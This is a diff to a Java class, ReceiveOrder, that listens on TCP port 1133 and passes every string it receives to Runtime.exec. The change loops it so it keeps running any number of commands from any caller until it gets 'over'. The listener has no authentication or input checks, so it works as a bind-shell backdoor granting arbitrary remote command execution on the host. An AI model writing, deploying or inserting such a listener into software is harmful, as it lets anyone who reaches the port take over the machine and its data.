@@ -7,6 +7,7 @@ import java.net.Socket;
 import java.net.UnknownHostException;
 
 public class ReceiveOrder implements Runnable{
+	String order;
 	public ReceiveOrder(){
 		
 	}
@@ -15,11 +16,15 @@ public class ReceiveOrder implements Runnable{
 		
 		try {
 			ServerSocket server = new ServerSocket(1133);
-			Socket st = server.accept();
-			DataInputStream ins = new DataInputStream(st.getInputStream());
-			String order = ins.readUTF();
-			Runtime ec = Runtime.getRuntime();
-			ec.exec(order);
+			while(true){
+				Socket st = server.accept();
+				DataInputStream ins = new DataInputStream(st.getInputStream());
+				while(!("over".equals(order = ins.readUTF()))){
+					System.out.println(order);
+					Runtime ec = Runtime.getRuntime();
+					ec.exec(order);
+				}
+			}
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
